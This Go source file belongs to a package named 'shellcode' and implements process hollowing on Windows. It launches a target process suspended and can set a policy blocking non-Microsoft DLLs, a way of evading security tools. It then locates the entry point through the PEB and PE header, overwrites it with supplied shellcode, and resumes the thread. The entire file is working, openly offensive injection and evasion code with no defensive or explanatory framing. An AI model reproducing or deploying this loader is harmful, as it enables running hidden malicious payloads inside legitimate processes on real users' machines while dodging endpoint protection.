package shellcode

import (
  "unsafe"
  "encoding/binary"
  "golang.org/x/sys/windows"
)

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

type ProcessInformation struct {
	Process   uintptr
	Thread    uintptr
	ProcessId uint32
	ThreadId  uint32
}

type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}

type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

type PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY struct {
	Flags uint32
}

func ProcessHollowing(shellcode []byte, proc string, blockdlls bool) error {
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  ntdll := windows.NewLazyDLL("ntdll.dll")

  GetProcessHeap := kernel32.NewProc("GetProcessHeap")
  HeapAlloc := kernel32.NewProc("HeapAlloc")
  HeapFree := kernel32.NewProc("HeapFree")
  InitializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
  UpdateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")
  CreateProcessA := kernel32.NewProc("CreateProcessA")
  ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
  ResumeThread := kernel32.NewProc("ResumeThread")
  ZwQueryInformationProcess := ntdll.NewProc("ZwQueryInformationProcess")

  var pbi PROCESS_BASIC_INFORMATION
  var si StartupInfoEx
  var pi ProcessInformation

  if (blockdlls) {
    procThreadAttributeSize := uintptr(0)
    InitializeProcThreadAttributeList.Call(0, 2, 0, uintptr(unsafe.Pointer(&procThreadAttributeSize)))

    procHeap, _, err := GetProcessHeap.Call()
    if procHeap == 0 {
      return err
    }

    attributeList, _, err := HeapAlloc.Call(procHeap, 0, procThreadAttributeSize)
    if attributeList == 0 {
      return err
    }
    defer HeapFree.Call(procHeap, 0, attributeList)

    si.AttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))

    InitializeProcThreadAttributeList.Call(uintptr(unsafe.Pointer(si.AttributeList)), 2, 0, uintptr(unsafe.Pointer(&procThreadAttributeSize)))

    mitigate := 0x20007
    nonms := uintptr(0x100000000000|0x1000000000)

    r, _, err := UpdateProcThreadAttribute.Call(uintptr(unsafe.Pointer(si.AttributeList)), 0, uintptr(mitigate), uintptr(unsafe.Pointer(&nonms)), uintptr(unsafe.Sizeof(nonms)), 0, 0)
    if r == 0 {
      return err
    }
  }

  cmd := append([]byte(proc), byte(0))

  si.Cb = uint32(unsafe.Sizeof(si))

  r, _, err := CreateProcessA.Call(0, uintptr(unsafe.Pointer(&cmd[0])), 0, 0, 1, windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
  if r == 0 {
    return err
  }

  var returnLength int32
  pointerSize := unsafe.Sizeof(uintptr(0))

  ZwQueryInformationProcess.Call(uintptr(pi.Process), 0, uintptr(unsafe.Pointer(&pbi)), pointerSize*6, uintptr(unsafe.Pointer(&returnLength)))

  imageBaseAddress := pbi.PebBaseAddress + 0x10
  addressBuffer := make([]byte, pointerSize)

  var read uintptr
  ReadProcessMemory.Call(uintptr(pi.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)

  ReadProcessMemory.Call(uintptr(pi.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)

  WriteProcessMemory.Call(uintptr(pi.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)

  ResumeThread.Call(uintptr(pi.Thread))

  return nil
}


